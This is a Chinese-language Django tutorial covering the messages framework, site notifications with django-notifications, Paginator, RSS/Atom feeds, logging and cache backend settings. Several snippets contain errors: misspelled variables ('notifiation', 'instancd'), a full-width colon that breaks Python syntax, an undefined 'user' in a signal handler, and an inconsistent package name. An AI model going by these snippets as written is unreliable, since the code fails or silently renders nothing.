MESSAGE_STORAGE = 'django.contrib.messages.storage.cookie.CookieStorage'

(4)class storage.base.BaseStorage
要编写自己的存储类,子类化django.contrib.messages.storage.base的BaseStorage,创建和实现_get和_store方法。

2. 消息级别/等级
消息框架基于类似于Python日志模块的可配置级别体系结构。消息级别允许按类型对消息进行分组,以便在视图和模板中以不同的方式过滤或显示消息

Django内置的message级别,可以从django.contrib.messages直接导入:
DEBUG   将在生产部署中忽略或删除的与开发相关的消息
INFO    普通提示信息,为用户提供信息消息
SUCCESS 成功信息
WARNING 警告信息
ERROR   已经发生的错误信息

settings.MESSAGE_LEVEL设置可用于更改最低记录级别或可根据请求更改,试图添加低于此级别的消息将被忽略
from django.contrib.messages import constants as message_constants
MESSAGE_LEVEL = message_constants.INFO

3. 消息样式
通常在前端HTML页面中希望给不同级别的消息增加不同的CSS样式,比如警告为黄色,error为红色等,Django提供了一个默认的样式对应关系,比如也就是说SUCCESS级别的消息在前端会被赋予一个success样式class
DEBUG   debug
INFO    info
SUCCESS success
WARNING warning
ERROR   error

若要修改消息级别的默认样式,设置MESSAGE_TAGS:
from django.contrib.messages import constants as messages
MESSAGE_TAGS = { messages.INFO: '', 50: 'critical', }

三、使用消息框架
1. 添加消息
from django.contrib import messages
messages.add_message(request, level, message, extra_tags='', fail_silently=False)
level消息级别、message消息内容字符串

messages.add_message(request, messages.INFO, 'Hello world.')

快捷方式
messages.debug(request, '%s SQL statements were executed.' % count)
messages.info(request, 'Three credits remain in your account.')
messages.success(request, 'Profile details updated.')
messages.warning(request, 'Your account expires in three days.')
messages.error(request, 'Document deleted.')

2. 显示消息
get_messages(request)

</pre>在模板文件中的使用方法<textarea>
# messages是一个列表,即使只有一条消息也必须用for标签循环它,否则下个请求中上个请求的消息不会被清除,可通过message.tags获取每个消息的CSS样式

{% if messages %}
< ul class="messages">
    {% for message in messages %}
    < li {% if message.tags %} class="{{ message.tags }}"{% endif %}>{{ message }}< /li>
    {% endfor %}
< /ul>
{% endif %}

# 有一个DEFAULT_MESSAGE_LEVELS变量映射消息级别的名称到它们的数值
{% if messages %}
< ul class="messages">
    {% for message in messages %}
    < li {% if message.tags %} class="{{ message.tags }}"{% endif %}>
        {% if message.level == DEFAULT_MESSAGE_LEVELS.ERROR %}Important: {% endif %}
        {{ message }}
    < /li>
    {% endfor %}
< /ul>
{% endif %}

{% if messages %}
< script>
    {% for msg in messages %}
        alert('{{ msg.message }}');
    {% endfor %}
< /script>
{% endif %}

</textarea>在模板的外面比如视图中可以使用get_messages()方法获取消息<textarea>
from django.contrib.messages import get_messages
storage = get_messages(request)
for message in storage:
    do_something_with_the_message(message)

</textarea><pre>
get_messages()返回存储后端的一个实例,循环这个实例可以获得每条消息,对于每一个消息实例都包含下面的属性,可以在模版或视图中调用:
message: 消息的实际内容文本,不要使用message.message,直接message。
level: 消息级别的一个整数。
tags: 一个字符串,由该消息的所有标签(extra_tags和tags)组合而成,组合时用空格分割开这些标签。
extra_tags: 一个字符串,由该消息的定制标签组合而成,并用空格分割。默认为空。
level_tag: 当前消息级别对应的CSS字符串,默认是相关常量名称的小写版本,但如果需要可以通过使用MESSAGE_TAGS设置来更改。

【 自定义消息级别 】
消息级别只是一个整数常量,所以可以自定义级别常量,并使用它们创建更多定制的用户反馈
CRITICAL = 50
def my_view(request): messages.add_message(request, CRITICAL, 'A serious error occurred.')

在自定义消息级别时应小心避免覆盖现有级别,内置级别对应整数值为:
DEBUG   10
INFO    20
SUCCESS 25
WARNING 30
ERROR   40

如果需要在HTML或CSS中使用自定义级别则需要通过MESSAGE_TAGS设置提供相应的映射关系。
如果要创建可重用的应用程序,建议只使用内置的消息级别,而不依赖任何自定义级别

【 自定义每个请求的最小记录级别 】
每个请求都可以通过set_level()方法设置最小记录级别,set_level()方法接收request为第一参数,消息级别为第二参数

from django.contrib import messages

# 修改最小级别为DEBUG
messages.set_level(request, messages.DEBUG)
messages.debug(request, 'Test message...')

# 在另外一个视图中修改最小级别为WARNING
messages.set_level(request, messages.WARNING)
messages.success(request, 'Your profile was updated.') # 被忽略,不记录
messages.warning(request, 'Your account is about to expire.') # 记录

# 将最小级别恢复到默认值
messages.set_level(request, None)

类似的,当前有效的记录级别可以用get_level()方法获取:
from django.contrib import messages
current_level = messages.get_level(request)

【 添加额外的消息CSS样式 】
要添加自定义的消息CSS样式,可以通过extra_tags参数:
messages.add_message(request, messages.INFO, 'Over 9000!', extra_tags='dragonball')
messages.error(request, 'Email box full', extra_tags='email')

【 在禁用消息框架时静默失败 】
如果正在编写一个可重用的应用程序或其他代码片段,并希望包含消息传递功能,但如果用户不希望启用它,可能会向add_message方法传递一个额外的关键字参数fail_silent = True,设置fail_silent =True只会隐藏当消息框架被禁用并试图使用add_message方法之一时发生的MessageFailure,不会隐藏由于其他原因可能发生的失败

messages.add_message(request, messages.SUCCESS, 'Profile details updated.', fail_silently=True)
messages.info(request, 'Hello world.', fail_silently=True)

【 消息过期机制 】
默认如果包含消息的迭代器完成迭代后当前请求中的消息都将被删除,如果想保留这些消息,那么需要显式的指定used参数为False
storage = messages.get_messages(request)
for message in storage: do_something_with(message)
storage.used = False

【 在基于类的视图中添加消息 】
class views.SuccessMessageMixin

success_message属性
向基于FormView的类添加一个success消息属性

get_success_message(cleaned_data)：cleaned_data是从用于字符串格式化的表单中清除的数据,通过使用%(field_name)的语法可以使用从表单中清理出来的数据进行字符串插值

</pre><textarea>
from django.contrib.messages.views import SuccessMessageMixin
from django.views.generic.edit import CreateView
from myapp.models import Author

class AuthorCreate(SuccessMessageMixin, CreateView):
    model = Author
    success_url = '/success/'
    success_message = "%(name)s was created successfully"

</textarea><pre>
get_success_message(self, cleaned_data)方法
对于ModelForms,如果需要从保存的对象访问字段,请覆盖get_success_message()方法

</pre><textarea>
from django.contrib.messages.views import SuccessMessageMixin
from django.views.generic.edit import CreateView
from myapp.models import ComplicatedModel

class ComplicatedCreate(SuccessMessageMixin, CreateView):
    model = ComplicatedModel
    success_url = '/success/'
    success_message = "%(calculated_field)s was created successfully"

    def get_success_message(self, cleaned_data):
        return self.success_message % dict(
            cleaned_data,
            calculated_field=self.object.calculated_field,
        )

【 创建消息分类显示模板,当消息的类型不同时显示不同的样式 】

</textarea><textarea>
# rearend/includes/message-alert-content.html
{% if messages %}
    {% for message in messages %}
        {% if message.level == DEFAULT_MESSAGE_LEVELS.INFO %}
            < div class="alert alert-info alert-dismissable">
                < button aria-hidden="true" data-dismiss="alert" class="close" type="button">×< /button>
                【信息】：{{ message }}
            < /div>
        {% endif %}

        {% if message.level == DEFAULT_MESSAGE_LEVELS.SUCCESS %}
            < div class="alert alert-success alert-dismissable">
                < button aria-hidden="true" data-dismiss="alert" class="close" type="button">×< /button>
                【成功】：{{ message }}
            < /div>
        {% endif %}

        {% if message.level == DEFAULT_MESSAGE_LEVELS.WARNING %}
            < div class="alert alert-warning alert-dismissable">
                < button aria-hidden="true" data-dismiss="alert" class="close" type="button">×< /button>
                【警告】：{{ message }}
            < /div>
        {% endif %}

        {% if message.level == DEFAULT_MESSAGE_LEVELS.ERROR %}
            < div class="alert alert-danger alert-dismissable">
                < button aria-hidden="true" data-dismiss="alert" class="close" type="button">×< /button>
                【错误】：{{ message }}
            < /div>
        {% endif %}
    {% endfor %}
{% endif %}

</textarea><pre>
【 UpdateView中使用message 】
form_valid定义消息添加
基于类的视图可以定义在验证表单的函数中

</pre><textarea>
@method_decorator(login_required, name='dispatch')
class BlogNoticeUpdate(UpdateView):
    model = BlogNotice
    template_name = 'rearend/blog-notice-edit.html'
    form_class = BlogNoticeForm
    context_object_name = 'blog_notice'
    # success_url = reverse_lazy('blog_admin:blog_notice')  # 这儿不能使用reverse

    def get_success_url(self):  # 自定义跳转链接
        return reverse_lazy('blog_admin:blog_notice', kwargs=self.kwargs)

    def form_valid(self, form):
        messages.success(self.request, '更新成功,该页面显示更新后的内容！')
        return super(BlogNoticeUpdate, self).form_valid(form)

</textarea><pre>
当然可以直接添加类方法,需要继承xxxMessageMixin父类

模板中包含消息模块

</pre><textarea>
< div class="ibox-content">
    <!--消息弹出-->
    {% include 'rearend/includes/message-alert-content.html' %}

    < form class="form-horizontal" method="post" action=".">
        < div class="form-group">
            < label for="id_blogger" class="col-sm-2 control-label">博主:< /label>
            < div class="col-sm-10">
                < input type="text" name="blogger" value="{{ form.blogger.value }}" maxlength="10" required="" id="id_blogger" class="form-control">
            < /div>
        < /div>
        < div class="form-group">
            < label for="id_title" class="col-sm-2 control-label">公告标题:< /label>
            < div class="col-sm-10">
                < input type="text" name="title" value="{{ form.title.value }}" maxlength="20" required="" id="id_title" class="form-control">
            < /div>
        < /div>
        < div class="form-group">
            < label for="id_content" class="col-sm-2 control-label">公告:< /label>
            < div class="col-sm-10">
                < textarea name="content" cols="40" rows="10" id="id_content" class="form-control">{{ form.content.value }}< /textarea>
            < /div>
        < /div>
        {% csrf_token %}
        < div class="hr-line-dashed">< /div>
        < div class="form-group">
            < div class="col-sm-4 col-sm-offset-2">
                < button class="btn btn-primary" type="submit">保存内容< /button>
            < /div>
        < /div>
    < /form>
< /div>

</textarea>

<h4>站内消息通知</h4><pre>
1、网站消息中心

2、通知的使用场景
评论和恢复发送消息通知被评论的用户
点赞发送消息通知被点赞的用户
用户注册发送消息
公告

3、点击消息跳转到对应的页面

【 django-notifications-hp 】
pip3 install django-notifications-hp
是一款和github通知相似的django第三方库,未读通知数、通知列表、标为已读
派生自django-activity-stream,社交类网站免不了关注、收藏、点赞、用户动态等功能,django-activity-stream这一个app全搞定

基本结构
发送人,接收人(一或多个),动作(简单内容),详细信息

给评论增加通知功能就是很流行的解决方案：比如微信朋友圈留言的通知、新浪微博留言的通知、以及各种社交平台的"小红点"

</pre><textarea>
{% for notification in request.user.notifications.all %}
    <li>[{{ notifiation.timesince }}之前], {{ notifiation.verb }}</li>
{% empty %}
    <li>暂无消息</li>
{% endfor %}

视图内发送站内消息
from notification.signals import notify
notify.send(user, recipient=user, verb='发送测试站内消息')

使用信号signals解耦
监测到数据库保存评论之后发送信号给消息接收器
# comment/signals.py
from django.db.models.signals import post_save
from django.dispatch import receiver
from notification.signals import notify
from .models import Comment

@receiver(post_save, sender=Comment)
def send_notification(sender, instance, **kwargs): # 例如评论入库之后instance表示comment模型的实例对象
    notify.send(user, recipient=user, verb='%s评论了你的文章' % instance.user.username)

@receiver(post_save, sender=Comment)
def send_email(sender, instance, **kwargs): #
    instance.send_mail()

# comment/apps.py
class CommentConfig(AppConfig):
    name = 'comment'

    def ready(self):
        super().ready()
        from . import signals

# comment/__init__.py
default_app_config = 'comment.apps.CommentConfig'

</textarea>用户注册时给自己发送用户注册通知,用户进入用户中心即可查看欢迎消息<textarea>
# user/signals.py
from django.db.models.signals import post_save
from django.dispatch import receiver
from django.contrib.auth.models import User
from notifications.signals import notify

@receiver(post_save, sender=User)
def send_notification(sender, instance, **kwargs):
    if kwargs['created'] == True：  # 是第一次创建,如修改密码、注册邮箱等调用save等情况不发送通知
        verb = '注册成功,更多精彩等你发现'
        notify.send(instance, recipient=instancd, verb=verb, action_object=instance)

# user/apps.py
class UserConfig(AppConfig):
    name = 'user'

    def ready(self):
        super().ready()
        from . import signals

# comment/__init__.py
default_app_config = 'user.apps.UserConfig'

</textarea><pre>
# 未读消息：request.user.notifications.unread
# 区别已读和未读消息可以采用已读消息color为灰色,数据库中将unread字段更新为Flase,用户在我的消息栏目点击消息即可跳转到博客页面的评论位置
{% for notification in request.user.notifications.all %}
    < li style="{%if not notifiation.unread%}color:gray;{%endif%}">
        [{{ notifiation.timesince }}之前],
        < a href="{{notifiation.data.url}}" style="{%if not notifiation.unread%}color:gray;{%endif%}">{{ notifiation.verb }}< /a>
    < /li>
{% empty %}
    < li>暂无未读消息< /li>
{% endfor %}

# settings.py
# django-notifications-hq设置发送的消息添加额外的字符串信息,例如作为展示消息时的链接url,通过data属性获取
DJANGO_NOTIFICATIONS_CONFIG = {
    'USE_JSONFIELD': True,
}

# user/signals.py
from django.db.models.signals import post_save
from django.dispatch import receiver
from django.utils.html import strip_tags
from notifications.signals import notify
from .models import Comment

@receiver(post_save, sender=Comment)
def send_notification(sender, instance, **kwargs):
    # 发送站内消息
    if instance.reply_to is None:
        # 评论
        recipient = instance.content_object.get_user()
        if instance.content_type.model == 'blog':
            blog = instance.content_object
            verb = '{0} 评论了你的《{1}》'.format(instance.user.get_nickname_or_username(), blog.title)
        else:
            raise Exception('unkown comment object type')
    else:
        # 回复
        recipient = instance.reply_to
        verb = '{0} 回复了你的评论"{1}"'.format(
                instance.user.get_nickname_or_username(),
                strip_tags(instance.parent.text)
            )
    url = instance.content_object.get_url() + "#comment_" + str(instance.pk)
    notify.send(instance.user, recipient=recipient, verb=verb, action_object=instance, url=url)

</pre>
</div>

<div id="django_paginator">
<h4>分页Paginator</h4><pre>
分页功能是几乎所有的网站上都需要提供的功能,当要展示的条目比较多时必须进行分页,不但能减小数据库读取数据压力,也有利于用户浏览。
Django提供了一个Paginator分页工具,但这个工具功能差了点不好添加CSS样式,所以前端的展示效果比较丑,可自己编写一个分页器
但当前的Paginator分页器还是值得学一下用一下的

向Paginator提供包含一些对象的列表,以及想每一页显示几条,比如每页5条、10条、20条、100条等,它就会提供访问的一系列API方法,示例如下:
>>> from django.core.paginator import Paginator
>>> objects = ['john', 'paul', 'george', 'ringo']
>>> p = Paginator(objects, 2)  # 对objects进行分页,虽然objects只是个字符串列表,但没关系,一样用。每页显示2条。
>>> p.count #对象个数, 4
>>> p.num_pages # 总共几页, 2
>>> type(p.page_range) # < class 'range'>
>>> p.page_range # 分页范围, range(1, 3)
>>> page1 = p.page(1) # 获取第一页
>>> page1 # < Page 1 of 2>
>>> page1.object_list # 获取第一页的对象, ['john', 'paul']

>>> page2 = p.page(2)
>>> page2.object_list # ['george', 'ringo']
>>> page2.has_next()  # 判断是否有下一页,False
>>> page2.has_previous()# 判断是否有上一页,True
>>> page2.has_other_pages() # 判断是否有其它页,True
>>> page2.next_page_number() # 获取下一页的页码,EmptyPage: That page contains no results
>>> page2.previous_page_number() # 获取上一页的页码,1
>>> page2.start_index() # 从1开始计数的当前页的第一个对象, 3
>>> page2.end_index() # 从1开始计数的当前页最后1个对象, 4

>>> p.page(0)  # 访问不存在的页面, EmptyPage: That page number is less than 1
>>> p.page(3) # 访问不存在的页面, EmptyPage: That page contains no results

使用Paginator分四步走:
使用任何方法获取要展示的对象列表QuerySet;
将列表和每页个数传递给Paginator,返回一个分页对象;
调用该对象的各种方法,获取各种分页信息;
在HTML模板中使用上面的分页信息构建分页栏。

在视图中使用Paginator
下面的例子假设拥有一个已经导入的Contacts模型,视图函数中使用Paginator,参考下面的代码:

</pre><textarea>
from django.core.paginator import Paginator, EmptyPage, PageNotAnInteger
from django.shortcuts import render

def listing(request):
    contact_list = Contacts.objects.all()
    paginator = Paginator(contact_list, 25) # 每页显示25条

    page = request.GET.get('page') # request.GET.get('page', 1)
    try:
        contacts = paginator.page(page)
    except PageNotAnInteger:
        contacts = paginator.page(1)  # 如果请求的页数不是整数,返回第一页
    except EmptyPage:
        contacts = paginator.page(paginator.num_pages)  # 如果请求的页数不在合法的页数范围内,返回结果的最后一页
    return render(request, 'list.html', {'contacts': contacts})

# 在list.html模板中,使用下面的范例来展示每个要显示的contact,以及最后的一个分页栏:

{% for contact in contacts %}
    {# 每个"contact"都是一个Contact模型对象. #}
    {{ contact.full_name|upper }}<br />
    ...
{% endfor %}

{# 分页标签的HTML代码 #}
<div class="pagination">
    <span class="step-links">
        {% if contacts.has_previous %}
            <a href="?page={{ contacts.previous_page_number }}">previous</a>
        {% endif %}

        <span class="current">
            Page {{ contacts.number }} of {{ contacts.paginator.num_pages }}.
        </span>

        {% if contacts.has_next %}
            <a href="?page={{ contacts.next_page_number }}">next</a>
        {% endif %}
    </span>
</div>

</textarea><pre>
【 Paginator对象 】
Paginator类拥有以下方法和属性:

方法:
Paginator.page(number)
返回指定页面的对象列表,比如第7页的所有内容,下标以1开始

属性:
Paginator.count:所有页面的对象总数。
Paginator.num_pages:页面总数。
Paginator.page_range:基于1的页数范围迭代器。

【 处理异常 】
正常请求时合法的1,2,3之类,但用户请求的可能是'apple','1000000','#',这就有可能导致异常,需要特别处理。Django内置了下面几个Paginator相关异常。

exception InvalidPage:异常的基类,当paginator传入一个无效的页码时抛出。
exception PageNotAnInteger:当向page()提供一个不是整数的值时抛出。
exception EmptyPage:当向page()提供一个有效值,但是那个页面上没有任何对象时抛出。
后面两个异常都是InvalidPage的子类,所以可以通过简单的except InvalidPage来处理它们。

【 Page对象 】
Paginator.page()将返回一个Page对象,主要的操作都是基于Page对象的,它具有下面的方法和属性:

方法:
Page.has_next():如果有下一页则返回True。
Page.has_previous():如果有上一页返回True。
Page.has_other_pages():如果有上一页或下一页返回True。
Page.next_page_number():返回下一页的页码,如果下一页不存在则抛出InvalidPage异常。
Page.previous_page_number():返回上一页的页码,如果上一页不存在则抛出InvalidPage异常。
Page.start_index():返回当前页上的第一个对象,相对于分页列表的所有对象的序号,从1开始,比如将五个对象的列表分为每页两个对象,第二页的start_index()会返回3。
Page.end_index():返回当前页上的最后一个对象,相对于分页列表的所有对象的序号,从1开始。 比如将五个对象的列表分为每页两个对象,第二页的end_index()会返回4。

属性:
Page.object_list:当前页上所有对象的列表。
Page.number:当前页的序号,从1开始计数。
Page.paginator:当前Page对象所属的Paginator对象。

</pre>
</div>

<div id="django_RSS/Atom">
<h4>聚合内容RSS/Atom</h4><pre>
Django提供了一个高层次的聚合内容框架,让创建RSS/Atom变得简单,需要做的只是编写一个简单的Python类。

一、范例
要创建一个feed只需要编写一个Feed类,然后设置一条指向Feed实例的URLconf就可以了

</pre>演示了某站点的最近五条新闻记录<textarea>
from django.contrib.syndication.views import Feed
from django.urls import reverse
from policebeat.models import NewsItem

class LatestEntriesFeed(Feed):
    title = "Police beat site news"
    link = "/sitenews/"
    description = "Updates on changes and additions to police beat central."

    def items(self):
        return NewsItem.objects.order_by('-pub_date')[:5]

    def item_title(self, item):
        return item.title

    def item_description(self, item):
        return item.description

    # item_link is only needed if NewsItem has no get_absolute_url method.
    def item_link(self, item):
        return reverse('news-item', args=[item.pk])

# 要设置链接这个feed的URL,只需要将这个Feed类的实例,作为参数加入URLconf
from django.conf.urls import url
from myproject.feeds import LatestEntriesFeed

urlpatterns = [
    # ...
    url(r'^latest/feed/$', LatestEntriesFeed()),
    # ...
]

</textarea><pre>
新建的Feed类继承于django.contrib.syndication.views.Feed。
title、link和description属性分别对应标准RSS的< title>、< link>和< description>元素。
items()方法简单地返回此Feed需要包含的对象,列表形式。
如果要创建一个Atom feed,而不是RSS feed,使用subtitle属性替代description。
在一个 RSS feed中,每一个< item>都有一个< title>, < link> 和< description>, 我需要告诉框架往这些对象里放入哪些数据。

对于< title>和< description>,Django将尝试调用Feed类中的item_title()和item_description()方法。 这两个方法都会被传入一个参数:item,也就是对象自己。

对于< link>,Django首先会尝试调用item_link()方法,如果该方法不存在,则使用对象的ORM模型中定义的get_absolute_url()方法。

二、指定feed类型
默认情况下使用RSS 2.0类型,如果要指定类型,在Feed类中添加feed_type属性

from django.utils.feedgenerator import Atom1Feed
class MyFeed(Feed): feed_type = Atom1Feed

目前可用的类型有下面三种:
django.utils.feedgenerator.Rss201rev2Feed (RSS 2.01. Default.)
django.utils.feedgenerator.RssUserland091Feed (RSS 0.91.)
django.utils.feedgenerator.Atom1Feed (Atom 1.0.)

三、同时发布Atom和RSS feeds
要同时发布这两者很简单,为Feed类创建一个子类,并且将其feed_type设置为需要的类型,最后添加一条URLconf就可以了

</pre><textarea>
from django.contrib.syndication.views import Feed
from policebeat.models import NewsItem
from django.utils.feedgenerator import Atom1Feed

class RssSiteNewsFeed(Feed):
    title = "Police beat site news"
    link = "/sitenews/"
    description = "Updates on changes and additions to police beat central."

    def items(self):
        return NewsItem.objects.order_by('-pub_date')[:5]

# 增加下面的子类
class AtomSiteNewsFeed(RssSiteNewsFeed):
    feed_type = Atom1Feed # 修改类型
    subtitle = RssSiteNewsFeed.description

# 增加路由:
from django.conf.urls import url
from myproject.feeds import RssSiteNewsFeed, AtomSiteNewsFeed

urlpatterns = [
    # ...
    url(r'^sitenews/rss/$', RssSiteNewsFeed()),
    url(r'^sitenews/atom/$', AtomSiteNewsFeed()),
    # ...
]

</textarea>
</div>

<div id="django_logging">
<h4>Django日志</h4><pre>
Django使用Python内置的logging模块实现它自己的日志系统。

在Python的logging模块中,主要包含下面四大金刚:
Loggers: 记录器
Handlers:处理器
Filters: 过滤器
Formatters: 格式化器

</pre>在Django视图中使用logging<textarea>
import logging  # 导入logging库
logger = logging.getLogger(__name__)  # 获取一个logger对象
def my_view(request, arg1, arg):
    if bad_mojo: logger.error('Something went wrong!') # 记录一个错误日志

</textarea><pre>
logger对象有下面几个常用内置方法:
logger.debug()
logger.info()
logger.warning()
logger.error()
logger.critical()

【 在Django中配置logging 】
使用logging模块一般都要对logging的四大金刚进行一定的配置。
Python的logging模块提供了好几种配置方式,默认Django使用dictConfig format,也就是字典方式。

</pre><textarea>
# 如果使用下面的样例,请确保Django用户对'filename'对应目录和文件的写入权限
LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'handlers': {
        'file': {
            'level': 'DEBUG',
            'class': 'logging.FileHandler',
            'filename': '/path/to/django/debug.log',
        },
    },
    'loggers': {
        'django': {
            'handlers': ['file'],
            'level': 'DEBUG',
            'propagate': True,
        },
    },
}

# 下面这个示例配置,让Django将日志打印到控制台,通常用做开发期间的信息展示
import os
LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'handlers': {
        'console': {
            'class': 'logging.StreamHandler',
        },
    },
    'loggers': {
        'django': {
            'handlers': ['console'],
            'level': os.getenv('DJANGO_LOG_LEVEL', 'INFO'),
        },
    },
}

# 下面是一个相当复杂的logging配置:
LOGGING = {
    'version': 1,    # 定义了配置文件的版本,当前版本号为1.0
    'disable_existing_loggers': False,
    'formatters': {  # 定义了两个formatter:simple和format,分别表示两种文本格式
        'verbose': { 'format': '%(levelname)s %(asctime)s %(module)s %(process)d %(thread)d %(message)s' },
        'simple': { 'format': '%(levelname)s %(message)s' },
    },
    'filters': {     # 定义了两个过滤器:SpecialFilter和RequireDebugTrue
        'special': {
            '()': 'project.logging.SpecialFilter',
            'foo': 'bar',
        },
        'require_debug_true': {
            '()': 'django.utils.log.RequireDebugTrue',
        },
    },
    'handlers': {   # 定义了两个处理器:console和mail_admins
        'console': {
            'level': 'INFO',
            'filters': ['require_debug_true'],
            'class': 'logging.StreamHandler',
            'formatter': 'simple'
        },
        'mail_admins': {
            'level': 'ERROR',
            'class': 'django.utils.log.AdminEmailHandler',
            'filters': ['special']
        }
    },
    'loggers': {   # 配置了三个logger:'django'、'django.request'和'myproject.custom'
        'django': {
            'handlers': ['console'],
            'propagate': True,
        },
        'django.request': {
            'handlers': ['mail_admins'],
            'level': 'ERROR',
            'propagate': False,
        },
        'myproject.custom': {
            'handlers': ['console', 'mail_admins'],
            'level': 'INFO',
            'filters': ['special']
        }
    }
}

</textarea><pre>
【 Django对logging模块的扩展 】
Django对logging模块进行了一定的扩展,用来满足Web服务器专门的日志记录需求。

1. 记录器 Loggers
Django额外提供了几个其内建的logger。
django: 不要使用这个记录器,用下面的,这是一个被供起来的记录器
django.request: 记录与处理请求相关的消息。5XX错误被记录为ERROR消息;4XX错误记录为WARNING消息。接收额外参数:status_code和request
django.server: 记录开发服务器下处理请求相关的消息,只用于开发阶段。
django.template: 记录与渲染模板相关的日志。
django.db.backends: 与数据库交互的代码相关的消息。
django.security: 记录任何与安全相关的错误。
django.security.csrf: 记录CSRF验证失败日志。
django.db.backends.schema: 记录查询导致数据库修改的日志。

2. 处理器 Handlers
Django额外提供了一个handler,AdminEmailHandler。这个处理器将它收到的每个日志信息用邮件发送给站点管理员。

3. 过滤器Filters
Django还额外提供两个过滤器。
CallbackFilter(callback):这个过滤器接受一个回调函数,并对每个传递给过滤器的记录调用它。如果回调函数返回False,将不会进行记录的处理。
RequireDebugFalse: 这个过滤器只会在settings.DEBUG==False时传递。

</pre>
</div>

<div id="django_cache">
<h4>Django与缓存</h4><pre>
Django建立的是动态网站,正常情况下,每次请求过来都经历了这样一个过程:
接收请求 -> url路由 -> 视图处理 -> 数据库读写 -> 视图处理 -> 模版渲染 -> 返回请求
设想一个用户或大量用户都对某个页面非常感兴趣,出现了大量实质相同的请求,如果每次请求都采取上面的流程,将出现大量的重复工作,尤其是大量无谓的数据库读写。要解决这个问题,有很多办法,其中一个就是使用缓存。

缓存的思路是既然已经处理过一次,得到了结果,就把当前结果缓存下来。下次再请求时缓存的处理结果直接返回,这样可以极大地减少重复工作,降低数据库负载。

缓存思路:
给定一个URL,试图在缓存中查询对应的页面
如果缓存中有该页面则返回这个缓存的页面
否则生成页面,将生成的页面保存到缓存中(用作以后),返回这个生成的页面

Django提供不同粒度不同层级的缓存:可以缓存指定的页面、难以生成的部分或整个站点。
Django也能很好的配合那些"下游"缓存, 比如Squid和基于浏览器的缓存

【 设置缓存 】
Django支持基于数据库的、文件的和内存的缓存,通常首先要对其进行设置,Django关于缓存的设置都位于settings.py中的CACHES配置项中。
Django支持下面几种缓存系统:

1. Memcached
Memcached是Django原生支持的缓存系统,速度快,效率高。Memcached是一种基于内存的缓存服务,起初是为了解决LiveJournal.com的负载问题而开发的,后来由Danga开源。 它被类似Facebook和维基百科这种大型网站使用,用来减少数据库访问次数,显著地提高了网站的性能。
Memcached会启动一个守护进程,并分配单独的内存块。其主要工作就是为缓存提供一个快速的添加、检索、删除的接口。所有的数据直接存储在内存中,所以它不能取代数据库或文件系统的功能

Memcached不是Django自带的软件,而是一个独立的软件,需要自己安装、配置和启动服务;
Memcached安装好了后,还要安装Python操作Memcached的依赖库,最常用的是python-memcached和pylibmc;
上面两个条件都满足了后,还要在Django中进行配置,配置方法:
根据安装的Python依赖库不同,将CACHES的BACKEND设置为django.core.cache.backends.memcached.MemcachedCache或django.core.cache.backends.memcached.PyLibMCCache
设置LOCATION为Memecached守护进程所在的主机IP和进程端口,格式为ip:port的字符串或unix:path的形式

</pre><textarea>
# Memcached运行在127.0.0.1:11211,使用了python-memcached库
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.memcached.MemcachedCache',
        'LOCATION': '127.0.0.1:11211',
    }
}

# 下面的Memcached运行在本地的Unix socket上:/tmp/memcached.sock,依赖python-memcached:
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.memcached.MemcachedCache',
        'LOCATION': 'unix:/tmp/memcached.sock',
    }
}

# 下面的Memcached运行在/tmp/memcached.sock,不带unix:/前缀,依赖pylibmc库:
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.memcached.PyLibMCCache',
        'LOCATION': '/tmp/memcached.sock',
    }
}

# Memcached支持分布式服务,可能同时在几台机器上运行,将它们的IP地址都加入到LOCATION中
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.memcached.MemcachedCache',
        'LOCATION': [
            '172.19.26.240:11211',
            '172.19.26.242:21423',
            '172.19.26.244:11213',
        ]
    }
}

</textarea><pre>
基于内存的缓存系统有个明显的缺点就是断电数据丢失,尤其是Memcached这种不支持序列化的缓存,所以请大家务必要注意数据的安全性。
建议选择redis作为缓存,还支持序列化。

2. 数据库缓存
使用缓存的很大原因就是要减少数据库的操作,如果将缓存又存到数据库就多此一举,所以尽量不要使用基于数据库的缓存
但某些情况下还是有一些用途的,比如有一个高速、高效索引的数据库。

</pre><textarea>
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.db.DatabaseCache',
        'LOCATION': 'my_cache_table',  # 将LOCATION 设置为数据库表的表名
    }
}

</textarea><pre>
创建缓存表
使用数据库缓存之前,必须通过下面的命令创建缓存表：
python manage.py createcachetable
这将在数据库中创建一个表,该表的格式与Django数据库缓存系统期望的一致。该表的表名取自LOCATION
如果正在使用多数据库缓存,createcachetable会对每个缓存创建一个表。
如果正在使用多数据库,createcachetable将遵循数据库路由的allow_migrate()方法。
像migrate一样,createcachetable不会影响已经存在的表,它只创建缺失的表。
要打印即将运行的SQL,而不是运行它,请使用createcachetable --dry-run选项

</pre><pre>
3. 文件系统缓存
连数据库慢,那么基于文件系统的更慢,不过在没有Redis、Memcached和数据库的时候也可以勉为其难的用一下

</pre><textarea>
# 基于Unix系统:
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
        'LOCATION': '/var/tmp/django_cache',
    }
}

# 基于Windows操作系统,需要带盘符路径:
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
        'LOCATION': 'c:/foo/bar',
    }
}

</textarea><pre>
4. 基于本地内存的缓存
如果本地主机内存够大够快,也可以直接使用它作为缓存

</pre><textarea>
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.locmem.LocMemCache',
        'LOCATION': 'unique-snowflake',
    }
}

</textarea><pre>
5. 开发用的缓存
Django设计了一个开发用的缓存,当生产环境是个大型的缓存系统,而在开发的时候又没有相应的缓存系统支持或不想用那种笨重的大家伙进行开发。但实际开发过程中又不得不接入缓存系统使用缓存的api,这种情况下开发用的缓存就很顺手了。

</pre><textarea>
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.dummy.DummyCache',
    }
}

</textarea><pre>
6. 自定义缓存后端
最高境界当然是使用自己开发的缓存系统了,Django是支持的,但前提是要有那能力,配置很简单:

</pre><textarea>
CACHES = {
    'default': {
        'BACKEND': 'path.to.backend',
    }
}

</textarea><pre>
7. 缓存参数
上述每一个缓存后端都可以设置一些额外的参数来控制缓存行为,可以设置的参数如下:

